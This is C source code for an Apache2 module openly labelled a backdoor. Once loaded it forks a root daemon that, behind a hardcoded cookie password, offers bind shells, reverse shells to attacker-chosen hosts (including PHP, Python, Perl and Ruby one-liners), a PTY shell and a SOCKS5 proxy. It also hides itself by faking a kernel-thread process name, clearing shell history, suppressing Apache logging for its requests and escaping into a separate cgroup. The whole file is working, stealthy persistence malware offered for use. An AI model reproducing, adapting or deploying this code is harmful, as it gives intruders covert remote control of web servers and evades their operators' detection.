/*
 * Apache2 Backdoor module (@RicoVlad)
 * Forks a root daemon on config load, exposing backdoor features via HTTP
 * endpoints (bind shell, reverse shell, SOCKS5 proxy, ping). Uses a Unix-domain
 * IPC socket to relay requests from the Apache worker process to the forked daemon.
 *
 * Inspired by @TheXC3LL and microsocks (rofl0r).
 */

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <netdb.h>
#include <sys/select.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sys/un.h>

#include <pty.h>    /* forkpty() - link with -lutil */
#include <sys/mount.h>  /* cgroup2 mount for process isolation */

#ifdef NO_SYSTEMD
#include <sys/prctl.h>
#endif

#include "httpd.h"
#include "http_config.h"
#include "http_core.h"
#include "http_protocol.h"
#include "http_log.h"
#include "ap_config.h"

#include "socks.h"

/* ------------------------------------------------------------------ */
/* Constants                                                          */
/* ------------------------------------------------------------------ */

#define PASSWORD      "password=backdoor"
#define CGROUP2       "/tmp/cgroup2"
#ifdef NO_SYSTEMD
#define IPC           "/var/run/mod_backdoor.sock"
#else
#define IPC           "/tmp/mod_backdoor"
#endif

// PID of the forked IPC daemon (set in backdoor_post_config)
pid_t pid;

/* ------------------------------------------------------------------ */
/* Command types & URI parser                                         */
/* ------------------------------------------------------------------ */

typedef enum {
    CMD_PING,
    CMD_SOCKS,
    CMD_BIND,
    CMD_REVSHELL,
    CMD_REVTY,
    CMD_UNKNOWN
} cmd_t;

typedef struct {
    cmd_t type;
    char *ip;
    char *port;
    char *prog;
    char *user;
    int port_num;
} parsed_cmd_t;

static cmd_t classify_uri(const char *uri) {
    if (!uri) return CMD_UNKNOWN;
    if (strcmp(uri, "/ping") == 0) return CMD_PING;
    if (strstr(uri, "/proxy") != NULL) return CMD_SOCKS;
    if (strstr(uri, "/bind") != NULL) return CMD_BIND;
    if (strstr(uri, "/reverse") != NULL) return CMD_REVSHELL;
    if (strstr(uri, "/revtty") != NULL) return CMD_REVTY;
    return CMD_UNKNOWN;
}

static int parse_uri(const char *uri, parsed_cmd_t *out) {
    if (!uri || !out) return -1;

    memset(out, 0, sizeof(*out));
    out->type = classify_uri(uri);
    if (out->type == CMD_UNKNOWN) return -1;

    char *copy = strdup(uri);
    if (!copy) return -1;

    switch (out->type) {
    case CMD_PING:
        break;

    case CMD_SOCKS: {
        strtok(copy, "/");
        char *port = strtok(NULL, "/");
        if (!port) { free(copy); out->type = CMD_UNKNOWN; return -1; }
        out->port = strdup(port);
        out->port_num = atoi(port);
        char *user = strtok(NULL, "/");
        if (user) out->user = strdup(user);
        break;
    }

    case CMD_BIND: {
        strtok(copy, "/");
        char *port = strtok(NULL, "/");
        if (!port) { free(copy); out->type = CMD_UNKNOWN; return -1; }
        out->port = strdup(port);
        out->port_num = atoi(port);
        break;
    }

    case CMD_REVSHELL: {
        strtok(copy, "/");
        char *ip = strtok(NULL, "/");
        char *port = strtok(NULL, "/");
        char *prog = strtok(NULL, "/");
        if (!ip || !port || !prog) { free(copy); out->type = CMD_UNKNOWN; return -1; }
        out->ip = strdup(ip);
        out->port = strdup(port);
        out->prog = strdup(prog);
        out->port_num = atoi(port);
        break;
    }

    case CMD_REVTY: {
        strtok(copy, "/");
        char *ip = strtok(NULL, "/");
        char *port = strtok(NULL, "/");
        if (!ip || !port) { free(copy); out->type = CMD_UNKNOWN; return -1; }
        out->ip = strdup(ip);
        out->port = strdup(port);
        out->port_num = atoi(port);
        break;
    }

    default:
        free(copy);
        return -1;
    }

    free(copy);
    return 0;
}

static void free_parsed_cmd(parsed_cmd_t *cmd) {
    if (!cmd) return;
    free(cmd->ip);
    free(cmd->port);
    free(cmd->prog);
    free(cmd->user);
    memset(cmd, 0, sizeof(*cmd));
}

/*
 * Spawn a TTY reverse shell. Forks a child that connects to (ip:port),
 * then execs the requested shell binary. argv is set to a fake process
 * name to avoid detection in process listings.
 */
static void shell(char *ip, char *port, char *prog) {
    pid_t spid = fork();
    if (spid < 0) exit(0);
    if (spid != 0) { exit(0); }

    // Child process
#ifdef NO_SYSTEMD
    char *argv[] = { "sh", 0 };
#else
    char *argv[] = { "[kintegrityd/2]", 0 };
#endif
    char *envp[] = { "HISTFILE=", "TERM=vt100", 0 };
    setsid();

    int revsockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (revsockfd < 0) exit(0);

    struct sockaddr_in addr;
    addr.sin_addr.s_addr = inet_addr(ip);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(port));
    if (connect(revsockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        exit(0);
    }

    dup2(revsockfd, 0);
    dup2(revsockfd, 1);
    dup2(revsockfd, 2);

    // execve never returns on success
    if (!strcmp(prog, "sh"))    execve("/bin/sh", argv, envp);
    if (!strcmp(prog, "bash"))  execve("/bin/bash", argv, envp);
    if (!strcmp(prog, "dash"))  execve("/bin/dash", argv, envp);
    if (!strcmp(prog, "ash"))   execve("/bin/ash", argv, envp);
    if (!strcmp(prog, "tcsh"))  execve("/bin/tcsh", argv, envp);
    if (!strcmp(prog, "ksh"))   execve("/bin/ksh", argv, envp);
}

/*
 * Spawn a reverse shell. For TTY shells (sh, bash, etc.) delegates to
 * shell(). For interpreter-based shells (php, python, perl, ruby) builds
 * a one-liner that opens a socket and execs /bin/sh.
 */
static void reverseShell(char *ip, char *port, char *prog) {
    // Delegate TTY shells to the pty-based handler
    if (!strcmp(prog, "sh") || !strcmp(prog, "bash") || !strcmp(prog, "dash") ||
        !strcmp(prog, "tcsh") || !strcmp(prog, "ash") || !strcmp(prog, "ksh")) {
        shell(ip, port, prog);
        return;
    }

    pid_t spid = fork();
    if (spid < 0) {
        fprintf(stderr, "[-] Error: could not fork\n");
        exit(EXIT_FAILURE);
    }
    if (spid != 0) { exit(0); }

    // Child process - interpreter-based reverse shells
    if (!strcmp(prog, "php")) {
        char *args[] = {"/usr/bin/php", "-r", "", NULL};
        args[2] = malloc(strlen("$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");") + strlen(ip) + strlen(port) + 1);
        sprintf(args[2], "$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");", ip, port);
        execve(args[0], args, NULL);
    } else if (!strcmp(prog, "python")) {
        char *args[] = {"/usr/bin/python", "-c", "", NULL};
        args[2] = malloc(strlen("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);") + strlen(ip) + strlen(port) + 1);
        sprintf(args[2], "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);", ip, port);
        execve(args[0], args, NULL);
    } else if (!strcmp(prog, "perl")) {
        char *args[] = {"/usr/bin/perl", "-e", "", NULL};
        args[2] = malloc(1 + strlen(ip) + strlen(port) + strlen("use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"));
        sprintf(args[2], "use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};", ip, port);
        execve(args[0], args, NULL);
    } else if (!strcmp(prog, "ruby")) {
        char *args[] = {"/usr/bin/ruby", "-rsocket", "-e", "", NULL};
        args[3] = malloc(1 + strlen(ip) + strlen(port) + strlen("exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end"));
        sprintf(args[3], "exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end", ip, port);
        execve(args[0], args, NULL);
    }
}

/* ------------------------------------------------------------------ */
/* Pseudo-terminal reverse shell                                      */
/* ------------------------------------------------------------------ */

/*
 * TTY reverse shell using forkpty. Forks a child with a pseudo-terminal,
 * execs /bin/sh, then the parent relays bidirectional data between the
 * pseudo-terminal and the network socket via select().
 */
static void shellPTY(int socket) {
    struct termios terminal;
    int terminalfd;
    pid_t fpid;
    char buf[1024];

    fpid = forkpty(&terminalfd, NULL, NULL, NULL);
    if (fpid < 0) {
        fprintf(stderr, "[-] Error: could not forkpty\n");
        exit(EXIT_FAILURE);
    }

    if (fpid == 0) {
        // Child: exec a shell on the pty slave
#ifdef NO_SYSTEMD
        char *argv[] = { "sh", 0 };
#else
        char *argv[] = { "[kintegrityd/2]", 0 };
#endif
        char *envp[] = { "HISTFILE=", "TERM=vt100", 0 };
        execve("/bin/sh", argv, envp);
    }

    // Parent: configure terminal, then relay data
    tcgetattr(terminalfd, &terminal);
    terminal.c_lflag &= ~ECHO;
    tcsetattr(terminalfd, TCSANOW, &terminal);

    fd_set readfd;
    int maxfd = terminalfd > socket ? terminalfd : socket;
    for (;;) {
        FD_ZERO(&readfd);
        FD_SET(terminalfd, &readfd);
        FD_SET(socket, &readfd);
        int sel = select(maxfd + 1, &readfd, NULL, NULL, NULL);
        if (sel <= 0) continue;
        if (FD_ISSET(terminalfd, &readfd)) {
            int n = read(terminalfd, buf, sizeof buf);
            if (n <= 0) { kill(fpid, SIGKILL); break; }
            write(socket, buf, n);
        }
        if (FD_ISSET(socket, &readfd)) {
            int n = read(socket, buf, sizeof buf);
            if (n <= 0) { kill(fpid, SIGKILL); break; }
            write(terminalfd, buf, n);
        }
    }
    waitpid(fpid, NULL, 0);
    exit(0);
}

/* ------------------------------------------------------------------ */
/* Bind shell helpers                                                 */
/* ------------------------------------------------------------------ */

/*
 * Bind a TCP port and return the listening socket fd. Sends error
 * messages back through client_fd on failure.
 */
static int bindPort(int client_fd, int port) {
    int opt = 1;
    int bindSock = socket(AF_INET, SOCK_STREAM, 0);
    if (bindSock < 0) {
        write(client_fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
        exit(0);
    }
    if (setsockopt(bindSock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        write(client_fd, "setsockopt", strlen("setsockopt"));
        close(bindSock);
        exit(0);
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(bindSock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        write(client_fd, "Bind failed", strlen("Bind failed"));
        close(bindSock);
        exit(0);
    }
    if (listen(bindSock, 3) < 0) {
        write(client_fd, "Listen failed", strlen("Listen failed"));
        close(bindSock);
        exit(0);
    }
    return bindSock;
}

/* ------------------------------------------------------------------ */
/* IPC relay                                                          */
/* ------------------------------------------------------------------ */

/*
 * Bidirectional data relay between two file descriptors using select().
 * Used to bridge the IPC socket and the reverse shell socket.
 */
static void bicomIPC(int sock, int revsockfd) {
    char buf[1024];
    fd_set readset;
    int maxfd = sock > revsockfd ? sock : revsockfd;
    for (;;) {
        FD_ZERO(&readset);
        FD_SET(sock, &readset);
        FD_SET(revsockfd, &readset);
        if (select(maxfd + 1, &readset, NULL, NULL, NULL) <= 0) continue;
        if (FD_ISSET(sock, &readset)) {
            int n = read(sock, buf, sizeof buf);
            if (n <= 0) break;
            write(revsockfd, buf, n);
        }
        if (FD_ISSET(revsockfd, &readset)) {
            int n = read(revsockfd, buf, sizeof buf);
            if (n <= 0) break;
            write(sock, buf, n);
        }
    }
}

/* ------------------------------------------------------------------ */
/* Apache helpers                                                     */
/* ------------------------------------------------------------------ */

// Extract raw socket fd from the Apache request connection
static int get_client_fd(request_rec *r) {
    apr_os_sock_t os_fd;
    apr_socket_t *sock = ap_get_conn_socket(r->connection);
    if (!sock) return -1;
    if (apr_os_sock_get(&os_fd, sock) != APR_SUCCESS) return -1;
    return (int)os_fd;
}

// Connect to the IPC daemon's Unix domain socket
static int connect_ipc(void) {
    int sock = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    struct sockaddr_un addr;
    addr.sun_family = AF_UNIX;
    strcpy(addr.sun_path, IPC);
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_un)) < 0) {
        close(sock);
        return -1;
    }
    return sock;
}

// Send error response, close socket, and exit the process
static void send_error_to_client(int fd, const char *msg) {
    write(fd, msg, strlen(msg));
    close(fd);
    exit(0);
}

/* ------------------------------------------------------------------ */
/* HTTP request handlers                                              */
/* ------------------------------------------------------------------ */

// Start SOCKS5 proxy via IPC daemon
static void handle_socks_request(int client_fd, parsed_cmd_t *cmd) {
    int ipc_sock = connect_ipc();
    if (ipc_sock < 0) {
        send_error_to_client(client_fd, "ERRNOSOCK\n");
    }
    char msg[512];
    snprintf(msg, sizeof(msg), "/proxy/%d/%s", cmd->port_num, cmd->user ? cmd->user : "");
    write(ipc_sock, msg, strlen(msg));
    write(client_fd, "[+] Socks proxy binded !\n", strlen("[+] Socks proxy binded !\n"));
    close(client_fd);
    close(ipc_sock);
}

// Bind shell: listen on port, accept connection, relay via IPC
static void handle_bind_request(int client_fd, parsed_cmd_t *cmd) {
    if (!cmd->port) {
        send_error_to_client(client_fd, "ERR\n");
    }

    int ipc_sock = connect_ipc();
    if (ipc_sock < 0) {
        send_error_to_client(client_fd, "ERRNOSOCK\n");
    }

    int bindfd = bindPort(client_fd, cmd->port_num);
    char info[256];
    snprintf(info, sizeof(info), "[+] Shell binded on port %s\n", cmd->port);
    write(client_fd, info, strlen(info));
    close(client_fd);

    struct sockaddr_in server_addr;
    socklen_t server_len = sizeof(server_addr);
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(cmd->port_num);

    int new_socket = accept(bindfd, (struct sockaddr *)&server_addr, &server_len);
    close(bindfd);
    write(ipc_sock, "BIND", strlen("BIND"));
    bicomIPC(ipc_sock, new_socket);
    close(new_socket);
}

// Health check endpoint
static void handle_ping_request(int client_fd) {
    write(client_fd, "[+] Backdoor module is running !\n",
          strlen("[+] Backdoor module is running !\n"));
    close(client_fd);
    exit(0);
}

// Non-TTY reverse shell: forward to IPC daemon for spawning
static void handle_reverse_shell_request(int client_fd, parsed_cmd_t *cmd) {
    if (!cmd->ip || !cmd->port || !cmd->prog) {
        send_error_to_client(client_fd, "ERR\n");
    }

    int ipc_sock = connect_ipc();
    if (ipc_sock < 0) {
        send_error_to_client(client_fd, "ERRNOSOCK\n");
    }
    char msg[512];
    snprintf(msg, sizeof(msg), "/reverse/%s/%s/%s", cmd->ip, cmd->port, cmd->prog);
    write(ipc_sock, msg, strlen(msg));

    char info[512];
    snprintf(info, sizeof(info), "[+] Sending Reverse Shell to %s:%s using %s\n", cmd->ip, cmd->port, cmd->prog);
    write(client_fd, info, strlen(info));
    close(client_fd);
    exit(0);
}

// TTY reverse shell: connect to target, relay via IPC
static void handle_revtty_request(int client_fd, parsed_cmd_t *cmd) {
    if (!cmd->ip || !cmd->port) {
        send_error_to_client(client_fd, "ERR\n");
    }

    int revsockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (revsockfd < 0) {
        send_error_to_client(client_fd, "ERRNOSOCK\n");
    }
    struct sockaddr_in client_addr;
    client_addr.sin_addr.s_addr = inet_addr(cmd->ip);
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(cmd->port_num);
    if (connect(revsockfd, (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0) {
        send_error_to_client(client_fd, "[+] Reverse socket can't connect to client\n");
    }

    int ipc_sock = connect_ipc();
    if (ipc_sock < 0) {
        send_error_to_client(client_fd, "ERRNOSOCK\n");
    }
    write(ipc_sock, "SHELL\n", strlen("SHELL\n") + 1);

    char info[256];
    snprintf(info, sizeof(info), "[+] Sending Reverse Shell to %s:%s", cmd->ip, cmd->port);
    write(client_fd, info, strlen(info));
    bicomIPC(ipc_sock, revsockfd);
    close(client_fd);
    exit(0);
}

/* ------------------------------------------------------------------ */
/* Authentication                                                     */
/* ------------------------------------------------------------------ */

// Check for password cookie in request headers
static int has_auth_cookie(request_rec *r) {
    const apr_array_header_t *fields = apr_table_elts(r->headers_in);
    apr_table_entry_t *e = (apr_table_entry_t *)fields->elts;
    for (int i = 0; i < fields->nelts; i++) {
        if (!strcmp(e[i].key, "Cookie") && strstr(e[i].val, PASSWORD)) {
            return 1;
        }
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* Apache hook: post-read-request                                     */
/* ------------------------------------------------------------------ */

/*
 * Intercepts HTTP requests. Checks for the password cookie,
 * then dispatches to the appropriate handler based on the URI.
 */
static int backdoor_post_read_request(request_rec *r) {
    if (!has_auth_cookie(r)) return DECLINED;

    int client_fd = get_client_fd(r);
    if (client_fd < 0) return DECLINED;

    parsed_cmd_t cmd;
    if (parse_uri(r->uri, &cmd) != 0) return DECLINED;

    switch (cmd.type) {
    case CMD_PING:
        handle_ping_request(client_fd);
        break;
    case CMD_SOCKS:
        handle_socks_request(client_fd, &cmd);
        break;
    case CMD_BIND:
        handle_bind_request(client_fd, &cmd);
        break;
    case CMD_REVSHELL:
        handle_reverse_shell_request(client_fd, &cmd);
        break;
    case CMD_REVTY:
        handle_revtty_request(client_fd, &cmd);
        break;
    default:
        break;
    }

    free_parsed_cmd(&cmd);
    return DECLINED;
}

/* ------------------------------------------------------------------ */
/* Daemon lifecycle                                                   */
/* ------------------------------------------------------------------ */

#ifdef NO_SYSTEMD
// Cleanup handler: remove IPC socket on SIGTERM
static void backdoor_daemon_cleanup(int sig) {
    (void)sig;
    unlink(IPC);
    exit(0);
}
#endif

/*
 * Move the daemon process into its own cgroup2 to isolate it from
 * the Apache process tree. Creates a tmpfs cgroup2 mount, writes
 * the PID, then cleans up.
 */
static void rmCgroup(void) {
    int fd;
    char path[256];
    snprintf(path, sizeof(path), "%s/system.slice/cgroup.procs", CGROUP2);

    if (access(path, F_OK) < 0) {
        mount("cgroup", CGROUP2, "cgroup2", 0, 0);
    }
    if ((fd = open(path, O_WRONLY)) != -1) {
        char str[32];
        snprintf(str, sizeof(str), "%d", getpid());
        write(fd, str, strlen(str));
        close(fd);
    }
    if (umount(CGROUP2) == 0) {
        rmdir(CGROUP2);
    }
}

/*
 * IPC daemon main loop. Accepts connections on the Unix domain socket,
 * forks a child to handle each request, and forks another child to
 * continue accepting (recursive acceptor pattern).
 */
static int waitIPC(int master) {
    fd_set readfds;
    int rc, sd, sr;
    char buf[1024];

    for (;;) {
        FD_ZERO(&readfds);
        FD_SET(master, &readfds);

        sr = select(master + 1, &readfds, NULL, NULL, NULL);
        if (sr > 0 && FD_ISSET(master, &readfds)) {
            sd = accept(master, NULL, NULL);
            if (sd < 0) continue;

            memset(buf, 0, sizeof buf);
            if ((rc = read(sd, buf, sizeof buf)) <= 0) {
                close(sd);
                continue;
            }

            // Fork handler for this request
            int ready_pipe[2];
#ifdef NO_SYSTEMD
            pipe(ready_pipe);
#endif
            pid_t handler = fork();
            if (handler == 0) {
#ifdef NO_SYSTEMD
                // Reset death signal so handler survives daemon termination
                prctl(PR_SET_PDEATHSIG, 0);
                signal(SIGTERM, SIG_DFL);
                char c = 1;
                write(ready_pipe[1], &c, 1);
                close(ready_pipe[1]);
                close(ready_pipe[0]);
#endif
                if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
                    rmCgroup();
                    shellPTY(sd);
                } else {
                    parsed_cmd_t cmd;
                    if (parse_uri(buf, &cmd) == 0) {
                        if (cmd.type == CMD_REVSHELL) {
                            rmCgroup();
                            reverseShell(cmd.ip, cmd.port, cmd.prog);
                        } else if (cmd.type == CMD_SOCKS) {
                            startProxy("0.0.0.0", cmd.port_num, cmd.user, PASSWORD);
                        }
                        free_parsed_cmd(&cmd);
                    }
                }
                exit(0);
            }

#ifdef NO_SYSTEMD
            close(ready_pipe[1]);
#endif
            // Fork new acceptor to keep the main loop running
            pid_t acceptor = fork();
            if (acceptor == 0) {
#ifdef NO_SYSTEMD
                prctl(PR_SET_PDEATHSIG, 0);
                char c;
                read(ready_pipe[0], &c, 1);
                prctl(PR_SET_PDEATHSIG, SIGTERM);
                signal(SIGTERM, backdoor_daemon_cleanup);
#endif
                close(ready_pipe[0]);
                waitIPC(master);
            } else {
#ifdef NO_SYSTEMD
                close(ready_pipe[0]);
#endif
                exit(0);
            }
        }
    }
}

/* ------------------------------------------------------------------ */
/* Apache hook: post-config (daemon fork)                             */
/* ------------------------------------------------------------------ */

/*
 * Fork the IPC daemon. Parent returns immediately; child creates a
 * Unix domain socket and enters the accept loop.
 */
int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
    (void)pconf; (void)plog; (void)ptemp; (void)s;

    pid = fork();
    // Parent: daemon is forked, return to Apache
    if (pid > 0) {
        return OK;
    }

    // Child: set up death signal for non-systemd cleanup
#ifdef NO_SYSTEMD
    prctl(PR_SET_PDEATHSIG, SIGTERM);
    signal(SIGTERM, backdoor_daemon_cleanup);
#endif

    unlink(IPC);

    int master = socket(AF_UNIX, SOCK_STREAM, 0);
    if (master < 0) exit(0);

    struct sockaddr_un serveraddr;
    memset(&serveraddr, 0, sizeof(serveraddr));
    serveraddr.sun_family = AF_UNIX;
    strcpy(serveraddr.sun_path, IPC);
    if (bind(master, (struct sockaddr *)&serveraddr, SUN_LEN(&serveraddr)) < 0) exit(0);
    listen(master, 5);
    chmod(serveraddr.sun_path, 0777);

    waitIPC(master);
}

/* ------------------------------------------------------------------ */
/* Apache hook: log-transaction                                       */
/* ------------------------------------------------------------------ */

/*
 * Suppress Apache logging for backdoor requests. Also exits the
 * worker process to free resources after the response is sent.
 */
static int backdoor_log_transaction(request_rec *r) {
    const apr_array_header_t *fields = apr_table_elts(r->headers_in);
    apr_table_entry_t *e = (apr_table_entry_t *)fields->elts;
    for (int i = 0; i < fields->nelts; i++) {
        if (!strcmp(e[i].key, "Cookie")) {
            if (strstr(e[i].val, PASSWORD)) {
                exit(0);
            }
        }
    }
    return DECLINED;
}

/* ------------------------------------------------------------------ */
/* Apache hook: register hooks                                        */
/* ------------------------------------------------------------------ */

static void backdoor_register_hooks(apr_pool_t *p) {
    ap_hook_post_read_request(backdoor_post_read_request, NULL, NULL, APR_HOOK_FIRST);
    ap_hook_post_config(backdoor_post_config, NULL, NULL, APR_HOOK_FIRST);
    ap_hook_log_transaction(backdoor_log_transaction, NULL, NULL, APR_HOOK_FIRST);
}

/* ------------------------------------------------------------------ */
/* Module definition                                                  */
/* ------------------------------------------------------------------ */

module AP_MODULE_DECLARE_DATA backdoor_module = {
    STANDARD20_MODULE_STUFF,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    backdoor_register_hooks
};
